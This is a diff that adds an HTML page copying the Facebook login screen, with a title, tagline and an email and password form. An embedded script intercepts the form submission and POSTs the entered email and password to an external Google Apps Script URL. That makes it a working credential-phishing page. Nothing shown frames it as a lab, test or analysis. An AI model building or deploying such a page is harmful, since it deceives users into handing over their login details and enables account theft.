@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
+    <title>Facebook</title>
+    <link rel="icon" href="media/download.png">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-wEmeIV1mKuiNpC+IOBjI7aAzPcEZeedi5yW5f2yOq55WWLwNGmvvx4Um1vskeMj0" crossorigin="anonymous">
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <div class="right">
+            <form method="post" name="facebook" action="">
+                <input name="email" type="text" placeholder="Email addess or phone number">
+                <input name="password" type="password" placeholder="Password">
+                <button class="loginBtn" name="submit">Log In</button>
+                <a href="" class="forget">Forgotten password?</a>
+                <div class="sign-up">
+                    <a href="" class="signupBtn">Create New Account</a>
+                </div>
+            </form>
+            <p><b>Create a Page</b> for a celebrity, band or business.</p>
+            
+        </div>
+    </div>
+    
+    <script type="text/javascript">
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbycejQ5GOlIfDaoIBkUR9sfwswmonp5C_RpjXj3MZFZhcdFYIUGISWBYtx1M9_SaIXJgw/exec'
+                const form = document.forms['facebook']
+              
+                form.addEventListener('submit', e => {
+                  e.preventDefault()
+                  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                   
+                })
+    </script>
+</body>
+</html>
